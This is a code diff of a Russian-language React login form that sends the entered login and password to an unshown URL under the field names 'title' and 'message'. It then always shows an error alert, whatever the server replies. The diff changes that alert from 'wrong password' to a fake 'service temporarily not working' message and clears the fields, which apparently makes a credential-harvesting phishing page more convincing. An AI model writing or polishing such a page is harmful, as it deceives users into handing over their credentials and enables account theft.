@@ -16,15 +16,14 @@ function App() {
   };
   const postFunction = async () => {
     try {
-      const { data } = await axios.post(url, {
-        title: text,
-        message: password,
-      });
+      const { data } = await axios.post(url, {  title: text,  message: password,});
+      setText('')
+      setPassword('')
       console.log(data);
     } catch (error) {}
   };
   let alertback = () => {
-    return alert("Неверный пароль");
+    return alert("Сервис временно не работает !");
   };
 
   useEffect(() => {
@@ -38,16 +37,20 @@ function App() {
           <div>
             <input
               className="px-5 md:w-[20%] py-2 rounded-md outline-none hover:bg-slate-200 "
+              value={text}
               onChange={(e) => setText(e.target.value)}
               type="text"
+              required
               placeholder="Логин"
             />
           </div>
           <div>
             <input
               className="px-5 md:w-[20%] py-2 rounded-md outline-none hover:bg-slate-200 "
+              value={password}
               onChange={(e) => setPassword(e.target.value)}
               type="password"
+              required
               placeholder="Пароль"
             />
           </div>
@@ -56,7 +59,8 @@ function App() {
               className="bg-slate-300 md:w-[20%] px-5 py-2 col-span-2 rounded-md active:bg-slate-400 hover:bg-slate-200 duration-75 "
               onClick={() => {
                 postFunction();
-                alertback();
+                alertback(); 
+                
               }}
             >
               войти
